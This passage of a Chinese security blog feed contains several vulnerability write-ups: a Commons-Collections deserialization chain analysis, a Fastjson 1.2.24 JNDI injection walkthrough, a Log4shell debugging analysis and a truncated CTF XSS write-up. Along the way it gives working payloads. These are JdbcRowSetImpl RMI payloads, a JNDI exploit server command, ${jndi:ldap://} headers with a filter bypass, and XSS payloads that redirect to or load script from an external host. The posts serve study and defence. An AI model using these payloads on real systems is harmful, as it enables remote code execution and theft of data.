而在我们构造的payload中，LazyMap的factory设置为了 ChainedTransformer ，此时 LazyMap#get 会调用factory的 transform() 方法，并在现在的map中加入这个元素（LazyMap的作用就是在被装饰者不包含某键名的Entry时调用工厂类去产生一个Entry），联系装饰器的作用可以很好地理解： 123456789101112public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123;//如果没有包含这个key Object value = factory.transform(key);//注意这里，尝试获取一个值 map.put(key, value);//注意这里，插入了获取的值 return value; &#125; return map.get(key); &#125; 而这时， ChainedTransformer 正好返回了值 yy ，所以便对lazyMap2装饰的HashTable插入了一个 yy=&gt;yy 。 为什么会提前终止流程？ 同样是在 AbstractMap#equals() 中，会提前判断待定的两者的size，如果不同，就会终止流程： 123456789public abstract class AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt; &#123; public boolean equals(Object o) &#123; ... Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o; if (m.size() != size()) return false; ... &#125; 3. 该链中的hash碰撞是怎么回事？ CC7为什么要构造hash碰撞？ 还是来看关键触发点，注意到要执行 e.key.equals(key) ，必须确保if语句中的第一个条件 e.hash == hash 为true，也就是说，待新加入的Entry的hash必须要和前面已经加入的元素的hash一致，所以这里需要一个HashTable的hash碰撞： 123456789101112131415private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value) throws StreamCorruptedException &#123; ... // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = hash(key); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;//注意这里的条件 throw new java.io.StreamCorruptedException(); &#125; &#125; ... &#125; 已知 yy 和 zZ 是一对hash碰撞，那还有没有其他的碰撞呢？ 在CC7中，获取的是LazyMap这个对象的hash，这个工作是由native代码（ Object.hashCode() ）实现的， https://github.com/openjdk/jdk/blob/jdk7-b24/jdk/src/share/native/java/lang/Object.c 1234567static JNINativeMethod methods[] = &#123; &#123;\"hashCode\", \"()I\", (void *)&amp;JVM_IHashCode&#125;, &#123;\"wait\", \"(J)V\", (void *)&amp;JVM_MonitorWait&#125;, &#123;\"notify\", \"()V\", (void *)&amp;JVM_MonitorNotify&#125;, &#123;\"notifyAll\", \"()V\", (void *)&amp;JVM_MonitorNotifyAll&#125;, &#123;\"clone\", \"()Ljava/lang/Object;\", (void *)&amp;JVM_Clone&#125;,&#125;; 其具体实现需要跟踪 JVM_IHashCode() 方法，这里不再展开，我们选择猜测和模拟该native。 参考java中常常提起的hashCode到底是个啥?，我们可以参考String对象中的hashCode方法重写： 12345678910111213141516public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; ... public int hashCode() &#123; int h = hash; if (h == 0 &amp;&amp; value.length &gt; 0) &#123; char val[] = value; for (int i = 0; i &lt; value.length; i++) &#123; h = 31 * h + val[i]; &#125; hash = h; &#125; return h; &#125; ... 首先，调试结果得到 yy 和 zZ 对应的LazyMap的hash都是3873。猜测对于LazyMap的hash，直接取了其中的字符串进行相同的操作，然后进行后续计算，我们将以上代码用python模拟一下，输出了3872，少了1： 12345678910def hashCode(string): h = 0 for i in string: h = 31 * h + ord(i) return hprint(hashCode('yy')) # 3872print(hashCode('zZ')) # 3872 但这足以说明String和LazyMap的hash是相关的。所以我们简单的减一下第一位的字母，选择为“yx”和“zY”： 12345678910def hashCode(string): h = 0 for i in string: h = 31 * h + ord(i) return hprint(hashCode('yx')) # 3871print(hashCode('zY')) # 3871 经验证，java中的输出为3870，这里又多了1，但这不影响该漏洞的触发，同样的，这对字符串能成功触发该链。类似的字符串对还有“AaAaAa”和“BBAaBB”等。 URLDNS 该链以HashMap的 reaObject() 作为入口，以 putForCreate -&gt; hash -&gt; k.hashCode() 的执行路径执行URL对象的 hashCode() 方法。 123456789101112131415161718192021222324252627282930public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable&#123; ... private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; ... // Read the keys and values, and put the mappings in the HashMap for (int i=0; i&lt;mappings; i++) &#123; K key = (K) s.readObject(); V value = (V) s.readObject(); putForCreate(key, value); //关键点 &#125; ... &#125; private void putForCreate(K key, V value) &#123; int hash = null == key ? 0 : hash(key); // 关键点 ... &#125; final int hash(Object k) &#123; ... h ^= k.hashCode();//关键点，调用URL对象的hashCode() ... &#125; 进而触发URLStreamHandler的 hashCode 方法： 12345678910public final class URL implements java.io.Serializable &#123; public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); // 关键点 return hashCode; &#125;&#125; URLStreamHandler的hashCode方法会访问相应的host： 12345678910111213public abstract class URLStreamHandler &#123; protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); // 关键点，此方法内部会以http协议访问相应的host地址 ...&#125; 调用栈大致为： 123456-&gt;HashMap.readObject()-&gt;HashMap.putForCreate()-&gt;HashMap.hash() -&gt;URL.hashCode() -&gt;URLStreamHandler.hashCode() -&gt;URLStreamHandler.getHostAddress() 总结 参考一张图（来源Theoyu-CommonsCollections，没找到原出处），可以清楚地看到各链之间的关系，有很多重合的链结： 为什么要使用反射： 在POP链的触发过程中，我们并不能像平时写代码一样直接执行任意的命令，只能通过POP链的一步一步执行来利用，而Transformer的一系列实现让我们能够在POP链执行中通过反射的形式达到执行恶意命令的目的（主要还是因为“链式转化器”只能执行函数，而反射过程只需要能执行函数即可）。 在构造payload时使用反射是因为很多情况下，我们需要用一个“空元素”去占位，否则就会在payload构造阶段就触发payload，导致反序列化利用失败。这一点在调试中经常发生，所以建议能占位就占位，最后再用反射去强行修改对象的成员变量。可以和调试结合来构造，因为过程中涉及很多繁琐的调用操作，静态地看很难找到原因。 恶意类的字节码加载中，一个类在运行时只会加载一次，如果要再次触发，需要换一个类名。 在理解链时，还要对各种类在实际开发时怎么使用，其设计思想是什么样的进行理解，这样才能理解链中的一些细节。 与POP链的对比：POP链的入口数更少，污点数更多；而Java的入口数更多，污点数反而更少。这是因为Java的语法繁琐性决定的：要找到一个可利用的污点对语法具有较高要求；而PHP往往仅需要一个函数即可触发。所以Java链一般从污点往回找，POP链一般从源往后找。 此外，由于Java的强类型性，与PHP相比，Java的链并没有那么灵活的链间跳转；如果PHP的成员对象也设置上类型限制（PHP新版本已支持类型限制），那么PHP的反序列化链数量将会大大减少。 参考资料 CC链 1-7 分析 Interface Transformer javasec CommonCollections deserialization attack payloads from ysoserial failing on &gt; JRE 8u72 Java 动态代理作用是什么？ - bravo1988的回答 - 知乎 JAVA反序列化 - Commons-Collections组件 Java反序列化CommonsCollections篇(一) CC1链手写EXP Theoyu-CommonsCollections CC第7链HashTable触发点深入分析 java中常常提起的hashCode到底是个啥?","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"Fastjson 1.2.24反序列化漏洞浅析","slug":"Fastjson-1-2-24反序列化漏洞浅析","date":"2022-03-25T09:09:42.000Z","updated":"2025-02-06T15:11:50.644Z","comments":true,"path":"posts/Web安全/20220325-fastjson.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20220325-fastjson.html","excerpt":"Fastjson 1.2.24反序列化漏洞浅析 Fastjson 1.2.24反序列化漏洞浅析 前言 概要 调试环境搭建 Fastjson初识 漏洞复现 利用过程跟踪 setXXX的触发过程 触发JNDI注入：JdbcRowSetImpl类的利用 总结 参考资料","text":"Fastjson 1.2.24反序列化漏洞浅析 Fastjson 1.2.24反序列化漏洞浅析 前言 概要 调试环境搭建 Fastjson初识 漏洞复现 利用过程跟踪 setXXX的触发过程 触发JNDI注入：JdbcRowSetImpl类的利用 总结 参考资料 前言 Fastjson 1.2.24反序列化漏洞，作为Java反序列化学习过程中必调试的一个经典漏洞，挖了很久的坑了，在这里填一下。 概要 Fastjson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法（与一般的反序列化调用readObject不相同，但思路类似）。JdbcRowSetImpl类的 setAutoCommit() 会调用 connect() 函数， connect() 会调用 InitialContext.lookup(dataSourceName) ，并且参数可控，造成JDNI注入。所以Fastjson的利用过程是从反序列化触发JNDI注入，涉及到两种漏洞。 调试环境搭建 最开始的时候想用p牛的vulhub，但发现没办法改Dockerfile，也不能改Java的启动设置，打不开debug模式。此处参考vulhub的docker hub记录、jar包和JAVA 漏洞靶场的Dockerfile，自己构建了Dockerfile。 选择较低版本的jdk方便复现，Dockerfile： 1234FROM openjdk:8u111-jdk-alpineCOPY fastjsondemo.jar /usr/src/fastjsondemo.jarENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=nCMD [&quot;java&quot;,&quot;-Dserver.address=0.0.0.0&quot;,&quot;-Dserver.port=8090&quot;,&quot;-jar&quot;,&quot;/usr/src/fastjsondemo.jar&quot;] docker-compose.yml ： 12345678910version : &apos;2&apos;services: server: build: context: . dockerfile: Dockerfile ports: - &quot;8090:8090&quot; - &quot;8000:8000&quot; Fastjson初识 摘自浅谈fastjson反序列化漏洞： fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean 说白了，Fastjson就是一个用来序列化/反序列化Java对象，并储存为json格式的库。JavaBean就是一种满足一些规范（比如实现 getXXX() 方法和 setXXX() 方法）的Java对象，可以简单理解为Java对象。 何为 @type 字段？ Java具有多态的特性，当一个对象的某属性是具有多态的对象时，如果不知道该对象的具体类别，fastjson仅会将其反序列化为父类，从而丢失了子类的额外属性。为了解决这个问题，fastjson提供了 SerializerFeature.WriteClassName 参数以及 @type 字段： 12345//这种方式会丢失成员属性的子类信息：String json = JSON.toJSONString(xxx);//这种方式会记录每一层的对象类型（添加一个@type字段），从而不丢失子类信息：String json = JSON.toJSONString(xxx, SerializerFeature.WriteClassName); 摘自浅谈fastjson反序列化漏洞： 如果@type被指定为某恶意的类，是否会产生漏洞？ 漏洞复现 应用存在一个根据请求发送的数据更新user对象属性的功能，该功能使用fastjson对请求数据进行解析： 123456@RequestMapping(value = &#123; \"/\" &#125;, method = &#123; RequestMethod.POST &#125;, produces = &#123; \"application/json;charset=UTF-8\" &#125;) @ResponseBody public Object setUser(@RequestBody final User user) &#123; user.setAge(Integer.valueOf(20)); return user; &#125; 在这里选择 JNDI-Injection-Exploit 作为JNDI恶意服务端，尝试执行 touch /tmp/hachp1 ： 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/hachp1&quot; -A &apos;x.x.x.x&apos; 因为没有bash，只有sh，不支持大括号的形式（ {echo,dG91Y2ggL3RtcC9oYWNocDE=}|{base64,-d}|{bash,-i} ） 使用对应的url rmi://x.x.x.x:1099/4fvkzz 构造RMI payload： 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://x.x.x.x:1099/4fvkzz\",\"autoCommit\":true&#125; 构造完整payload： 1&#123;\"name\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://x.x.x.x:1099/lxtcyl\",\"autoCommit\":true&#125;, \"age\":20&#125;&#125; 利用过程跟踪 setXXX的触发过程 在此漏洞中，触发的是以“set”开头的被反序列化的对象的方法。 由于json解析是通过框架的Filter进行，无法直接在应用中打断点，需要去fastjson库里打断点。 漏洞的实际入口在 fastjson-1.2.24-sources.jar!\\com\\alibaba\\fastjson\\support\\spring\\FastJsonHttpMessageConverter.java#190 : 1return JSON.parseObject(in, fastJsonConfig.getCharset(), type, fastJsonConfig.getFeatures()); 跟进去，首先进入词法分析和语法分析器（json的语法比较简单，fastjson是按位进行解析的），在 fastjson-1.2.24.jar!\\com\\alibaba\\fastjson\\parser\\DefaultJSONParser.class#322 ，如果匹配到“@type”，会获取相关的类（在这里是JdbcRowSetImpl类）： 1234if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; String typeName = lexer.scanSymbol(symbolTable, '\"'); Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader()); ... fastjson-1.2.24.jar!\\com\\alibaba\\fastjson\\parser\\DefaultJSONParser.class#367 会获取相应的反序列化器： 12ObjectDeserializer deserializer = config.getDeserializer(clazz);return deserializer.deserialze(this, clazz, fieldName); 跟进去，会在 fastjson-1.2.24-sources.jar!\\com\\alibaba\\fastjson\\parser\\ParserConfig.java#createJavaBeanDeserializer:526 调用JavaBeanInfo类的build方法： 1JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy); 其中包括了获取要反序列化的类有哪些成员属性和方法( fastjson-1.2.24-sources.jar!\\com\\alibaba\\fastjson\\util\\JavaBeanInfo.java#build:134 )： 12Field[] declaredFields = clazz.getDeclaredFields();Method[] methods = clazz.getMethods(); 在 fastjson-1.2.24-sources.jar!\\com\\alibaba\\fastjson\\util\\JavaBeanInfo.java#build:328 会对获取的方法依次遍历，如果方法名以 set 开头，则会获取对应的属性 123456789101112131415161718for (Method method : methods) &#123;... if (!methodName.startsWith(\"set\")) &#123; continue; &#125; //对\"set\"开头的方法进行处理，获取对应的属性 char c3 = methodName.charAt(3); ... else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123; propertyName = TypeUtils.decapitalize(methodName.substring(3)); //获取属性 &#125;&#125; 这些属性会被存入FieldInfo对象中，供后期反序列化时使用。可以看到，只要是“set”开头的方法，都会尝试获取其对应属性。此外，“get”开头的方法也会在 build 方法中做类似操作。 之后，会根据以上获得的类相关信息在 fastjson-1.2.24-sources.jar!\\com\\alibaba\\fastjson\\parser\\deserializer\\ASMDeserializerFactory.java:78 ，通过ASM动态加载字节码以获得类 com.sun.rowset.JdbcRowSetImpl 的对应的反序列化器 FastjsonASMDeserializer_2_JdbcRowSetImpl.class （只有在初次加载时才会调用，再次加载时会从hashmap中查找，所以再次跟时需要重启服务器）： 123byte[] code = cw.toByteArray();Class&lt;?&gt; exampleClass = defineClassPublic(classNameFull, code, 0, code.length); 由于后面的漏洞触发过程中会用到该类，我们在这里把它dump出来，通过动态执行，该类的字节码会dump到docker的根目录下： 1(new FileOutputStream(\"some.class\")).write(code) 然后继续执行， fastjson-1.2.24.jar!\\com\\alibaba\\fastjson\\parser\\DefaultJSONParser.class#368 对刚加载的动态类进行反序列化： 1return deserializer.deserialze(this, clazz, fieldName); 该过程将会进入到动态加载的类，调用该类的 deserialze 方法，盗版deserialize，没有i :) 我们来看一下动态加载的反序列化器类，ASM得到的反序列化器类继承了 JavaBeanDeserializer ： 123public class FastjsonASMDeserializer_2_JdbcRowSetImpl extends JavaBeanDeserializer &#123; ...&#125; 之后会调用 deserialze 方法，所以可以在 JavaBeanDeserializer#deserialze:271 打断点。然后会执行parseField方法，以还原对象的属性： JavaBeanDeserializer#deserialze:600 ： boolean match = parseField(parser, key, object, type, fieldValues); 然后执行到 JavaBeanDeserializer#parseField:773 ： fieldDeserializer.parseField(parser, object, objectType, fieldValues); 跟进： DefaultFieldDeserializer#parseField:71 ： 1value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name); 当在此处尝试反序列化我们构造的恶意类的成员属性时，会进入 JavaBeanDeserializer#deserialze:593 ，调用 setValue 方法： 1fieldDeser.setValue(object, fieldValue); 在 FieldDeserializer#setValue:96, 如果需要反序列化对应属性XXX，会调用之前获取到的“setXXX”方法： 1method.invoke(object, value); 再次回顾一下payload： {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/hzbsma&quot;,&quot;autoCommit&quot;:true} ，可以注意到，在反序列化时会设置对象的 autoCommit 的属性，此时会调用其 setAutoCommit 方法。另外还有一个细节，我们把 dataSourceName 属性放到前面，是因为需要先给对象的 dataSourceName 赋值，fastjson按照字节一个一个的处理，所以在处理后面的 setAutoCommit 时，该属性已经被赋值了。 到这里，fastjson的“setXXX”触发过程分析完毕。 触发JNDI注入：JdbcRowSetImpl类的利用 下面我们再来看一下利用的触发JDNI注入的类，可以看到会使用 dataSourceName 属性作为参数，触发JNDI查询： 12345678910111213141516171819202122232425package com.sun.rowset;...public class JdbcRowSetImpl extends BaseRowSet implements JdbcRowSet, Joinable &#123;... public void setAutoCommit(boolean var1) throws SQLException &#123; if (this.conn != null) &#123; this.conn.setAutoCommit(var1); &#125; else &#123; this.conn = this.connect(); this.conn.setAutoCommit(var1); &#125; &#125; private Connection connect() throws SQLException &#123; ... InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());//getDataSourceName返回本对象的DataSourceName属性，调用了lookup函数，存在JNDI注入漏洞 ... &#125;... 到这里，整个漏洞触发过程分析完毕（后面就是接JNDI注入的链的过程了，这里不再赘述）。对于Java安全的初学者：Java的 this.getXXX() 可以看作是 this.XXX ，与php的反序列化链类似。比如 this.getDataSourceName() 看作 this.dataSourceName ，所以payload中对该属性进行了赋值。 总结 fastjson支持@type以指定反序列化的类别-&gt;想到恶意类 怎么利用？fastjson还原json数据时会实例化对象、会还原该对象的属性-&gt;调用getXXX和setXXX-&gt;查找拥有能够利用的getXXX或setXXX方法的类 后续JNDI利用：JNDI利用链的跟踪，与fastjson没有直接的关系 在反序列化一个对象前会先获取对应的反序列化器，有的反序列化器通过ASM动态加载得到 跟踪的难点在于词法解析的过程比较复杂，且过程中存在动态加载的类，无法直接源码调试 整个跟踪过程实际上是学习fastjson在解析对象时如何构造其反序列化器，反序列化器中会获取要反序列化的类的成员方法和成员变量，并根据情况调用其setXXX()和getXXX()方法 参考资料 fastjson 1.2.24 反序列化导致任意命令执行漏洞 JAVA 漏洞靶场 浅谈fastjson反序列化漏洞 Java bean 是个什么概念？ - 杨博的回答 - 知乎","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"Log4shell（CVE-2021-44228）调试分析","slug":"Log4shell（CVE-2021-44228）调试分析","date":"2022-03-07T09:33:49.000Z","updated":"2025-02-06T15:11:50.758Z","comments":true,"path":"posts/Web安全/20220307-log4shell.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20220307-log4shell.html","excerpt":"Log4shell（CVE-2021-44228）调试分析 Log4shell（CVE-2021-44228）调试分析 漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料","text":"Log4shell（CVE-2021-44228）调试分析 Log4shell（CVE-2021-44228）调试分析 漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料 漏洞背景 Log4j是一个应用广泛的Java日志库，为了方便开发者规定日志的格式，Log4j提供了一个能够直接通过传入记录函数的字符串来格式化日志的功能。该功能除了支持一些常见的功能（如获取时间等），还能调用到JNDI协议。JNDI协议本身是为了方便程序员在不用关注一个对象的具体位置而能获取一个数据或者对象的功能，它本身是为了方便程序员，但也易被攻击者利用，造成JNDI注入或者反序列化攻击。 环境安装 选择Log4Shell sample vulnerable application进行环境构建。为了能够远程调试，将docker中的jar中的lib引入到本地项目中。docker run -p 10086:8080 -p 10087:8000 --name vulnerable-app --rm vulnerable-app 该项目通过spring-boot-starter-log4j2:2.6.1引入包含漏洞的Log4j 2.14.1 漏洞触发 项目中的关键代码如下(MainController.java)： 12345678910111213141516171819import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestHeader;import org.springframework.web.bind.annotation.RestController;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;@RestControllerpublic class MainController &#123; private static final Logger logger = LogManager.getLogger(\"HelloWorld\"); @GetMapping(\"/\") public String index(@RequestHeader(\"X-Api-Version\") String apiVersion) &#123; logger.info(\"Received a request for API version \" + apiVersion); return \"Hello, world!\"; &#125;&#125; 在http header中加入： 1X-Api-Version: $&#123;jndi:ldap://xxxx.ceye.io&#125; 漏洞跟踪过程 首先通过LogManager.getLogger(&quot;HelloWorld&quot;)获取HelloWorld的Logger，记录的信息中可以直接触发JNDI导致的反序列化 1logger.info(\"Received a request for API version \" + apiVersion); 123public void info(final String message) &#123; this.logIfEnabled(FQCN, Level.INFO, (Marker)null, (String)message, (Throwable)((Throwable)null)); &#125; 需要满足this.isEnabled(level, marker, message, throwable)： 123456public void logIfEnabled(final String fqcn, final Level level, final Marker marker, final String message, final Throwable throwable) &#123; if (this.isEnabled(level, marker, message, throwable)) &#123; this.logMessage(fqcn, level, marker, message, throwable); &#125; &#125; 先不去跟这个条件，直接跟到logMessage： 123protected void logMessage(final String fqcn, final Level level, final Marker marker, final String message, final Throwable throwable) &#123; this.logMessageSafely(fqcn, level, marker, this.messageFactory.newMessage(message), throwable); &#125; 经过一系列跟踪，在callAppenders中的n层会执行format方法： 123for(int i = 0; i &lt; len; ++i) &#123; this.formatters[i].format(event, buffer); &#125; 其中会遍历处理各种情况的formatter，当遇到JNDI字符串时，会进入org\\apache\\logging\\log4j\\core\\pattern\\MessagePatternConverter.class： 123456789if (this.config != null &amp;&amp; !this.noLookups) &#123; for(int i = offset; i &lt; workingBuilder.length() - 1; ++i) &#123; if (workingBuilder.charAt(i) == '$' &amp;&amp; workingBuilder.charAt(i + 1) == '&#123;') &#123;//注意这里，很明显能看到$&#123;&#125;语句的解析 String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));//这里的replace方法中包含对JNDI的匹配以及处理 &#125; &#125; &#125; 跟进去，跟到org\\apache\\logging\\log4j\\core\\lookup\\StrSubstitutor.class中的substitute()的361行的this.substitute(event, bufName, 0, bufName.length())（很明显这是一个递归解析的过程，如果这里匹配出的内容还嵌套了合法的语句，则会进一步解析）： 12345678910&#125; else &#123; if (nestedVarCount == 0) &#123; String varNameExpr = new String(chars, startPos + startMatchLen, pos - startPos - startMatchLen); if (substitutionInVariablesEnabled) &#123; StringBuilder bufName = new StringBuilder(varNameExpr); this.substitute(event, bufName, 0, bufName.length());//执行到这里时，语法解析已经成功把JNDI协议请求的地址匹配出来，跟进这里 varNameExpr = bufName.toString(); &#125; pos += endMatchLen; 解析出需要发起JNDI请求的地址时，就会进入如下流程（418行）： 123456this.checkCyclicSubstitution(varName, (List)priorVariables);((List)priorVariables).add(varName);String varValue = this.resolveVariable(event, varName, buf, startPos, pos);//会在此处发起请求，跟进去if (varValue == null) &#123; varValue = varDefaultValue;&#125; 然后会根据传入resolveVariable的参数获取相应的lookup，这里的resolver包含多种协议：{date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j}， 1234protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) &#123; StrLookup resolver = this.getVariableResolver();//此处会获取多种协议 return resolver == null ? null : resolver.lookup(event, variableName);//进行lookup &#125; 然后进入org\\apache\\logging\\log4j\\core\\lookup\\Interpolator.class，跟到190行，此处会根据prefix字符串找到对应的lookup，之后就会执行lookup： 1234567891011String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);String name = var.substring(prefixPos + 1);StrLookup lookup = (StrLookup)this.strLookupMap.get(prefix);//这里会根据prefix找到相应协议的lookupif (lookup instanceof ConfigurationAware) &#123; ((ConfigurationAware)lookup).setConfiguration(this.configuration);&#125;String value = null;if (lookup != null) &#123; value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);//再跟入这里&#125; 最后进入org\\apache\\logging\\log4j\\core\\lookup\\JndiLookup.class发起JNDI请求（42行）： 123try &#123; var6 = Objects.toString(jndiManager.lookup(jndiName), (String)null);&#125; 到这里整个流程分析完毕。 总结 整个跟洞过程实际上就是对Log4j的format解析过程进行理解和跟踪，理解了如何递归地处理待记录信息中的语法问题等过程，就能够理解Log4shell。 根本原因和官方修复手段 Log4j 2的日志格式化功能提供了一系列lookup的功能，支持${}语法，能够方便地获取系统信息等（可见Configuration以及 Lookups 。这些功能中包括一个Jndi Lookup的功能，该功能能够通过日志调用Jndi，是漏洞的关键，造成攻击者能够以${jndi:ldap://xxx.xxx/x}的形式调用JNDI。 官方给出的临时解决方法：直接删除Jndi类： &gt; Otherwise, in any release other than 2.16.0, you may remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 修复1（对于2.10&lt;=,&lt;2.15的版本）：增加了默认设置不使用lookup功能，但这种情况仅适用于直接使用形如logger.info(Untrusted_message)的形式，而有的开发者需要获取和记录诸如User-agent的信息，此时必须执行变量的put操作并对log4j的模板（log4j2.properties文件中的设置）进行渲染，仍然会导致lookup的发生。 修复2（2.15版本）：Restrict LDAP access via JNDI (#608)，该修复中增加了默认设置不使用lookup功能（与修复1相同）。此外还限制了LDAP的目标服务器（仅支持127的ip）和可用的类，并且对JNDI的可用协议进行了限制。但是由于对127的检测有可以绕过的方法，使用诸如${jndi:ldap://127.0.0.1#a.attacker.com/a}形式的payload便可以绕过（该地址虽然不合法，但攻击者可以在自己的DNS中加入该域名，同样会执行成功） 在最新版中，该功能仅支持java:和无协议，不支持LDAP协议 参考资料 Apache Log4j Security Vulnerabilities log4j2 JNDI注入漏洞速通 Log4j RCE vulnerability explained with bypass for the initial fix (CVE-2021-44228, CVE-2021-45046)","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"强网杯2021 easyxss wp","slug":"强网杯2021-easyxss-wp","date":"2021-06-15T06:09:42.000Z","updated":"2025-02-06T15:11:51.638Z","comments":true,"path":"posts/Web安全/20210615-qwb2021.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20210615-qwb2021.html","excerpt":"强网杯2021 easyxss wp 强网杯2021 easyxss wp 前言 网站功能描述 CSP限制 弹窗 成功传输到XSS平台的payload /flag 路由下的flag猜解 做题的恶劣环境下的解法 后话","text":"强网杯2021 easyxss wp 强网杯2021 easyxss wp 前言 网站功能描述 CSP限制 弹窗 成功传输到XSS平台的payload /flag 路由下的flag猜解 做题的恶劣环境下的解法 后话 前言 这题的环境和官方态度一言难尽，见后话。 网站功能描述 一个写日志的网站，需要注册登录。有一个提交url的地址，提交过去之后拥有管理员权限的bot会去访问。 写好的日志能够搜索、还有一个渲染页面。 主要考点是CSP的绕过，并且黑名单了一些字符。 CSP限制 1Content-Security-Policy: default-src &apos;self&apos;; form-action &apos;self&apos;; frame-ancestors &apos;self&apos;; style-src &apos;self&apos;; img-src &apos;self&apos;; script-src &apos;nonce-e5DgJ35L8SEgJZIP7REN9w==&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/ 可以看到还是比较严格的， script-src 基本上就是 nonce 和谷歌的几个没啥利用方法的path（https://www.gstatic.com/recaptcha/、https://www.google.com/recaptcha/api.js） 47.104.192.54:8888/about?theme=hachp1 弹窗 由于nonce的存在，没办法直接插入 script ，所以不能用写日志的方式进行储存型XSS。发现渲染页面直接把参数 theme= 输出在本身带有nonce的script标签中，而且双引号没过滤，所以闭合一下，成功弹窗： 1http://47.104.192.54:8888/about?theme=%22;&#125;);alert(%2211111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111%22);a=(&#123;//%22; 经测试，可以使用的字符：asd123/()., ; =-+?$: 过滤了src、get、body等关键词（环境打不开了，没有记下来） 用location可以向XSS平台传payload： 1http://47.104.192.54:8888/about?theme=%22%3b%7d)%3bwindow.location.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%3fc%3d123%22%3ba%3d(%7b%2f%2f%22%3b 由于bot访问的是localhost，测试url： 1http://localhost:8888/about?theme=%22%3b%7d)%3bwindow.location.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%3fc%3d123%22%3ba%3d(%7b%2f%2f%22%3b 这题出题人和主办方对环境的考虑有很大问题，这题本来就是一个可能大量交互的题目，居然还用公共靶机，我做这题的时候时间已经比较晚了，当时BOT已经被其他师傅D烂了，根本做不了。。。 以下为一些失败的payload，多数是由于黑名单限制没能成功，供参考： 12345678910111213document.body.appendChild(document.createElement(&quot;script&quot;)).src=&quot;//129.204.230.95/1.js&quot;http://47.104.192.54:8888/about?theme=%22;&#125;);document.body.appendChild(document.createElement(&quot;script&quot;)).src=&quot;//129.204.230.95/1.js&quot;;a=(&#123;//%22;$.getScript`http://129.204.230.95/1.js`http://47.104.192.54:8888/about?theme=%22;&#125;);function createXmlHttp() &#123; if (window.XMLHttpRequest) &#123; xmlHttp = new XMLHttpRequest() &#125; else &#123; var MSXML = new Array(&quot;MSXML2.XMLHTTP.5.0&quot;, &quot;MSXML2.XMLHTTP.4.0&quot;, &quot;MSXML2.XMLHTTP.3.0&quot;, &quot;MSXML2.XMLHTTP&quot;, &quot;Microsoft.XMLHTTP&quot;); for (var n = 0; n &lt; MSXML.length; n++) &#123; try &#123; xmlHttp = new ActiveXObject(MSXML[n]); break &#125; catch(e) 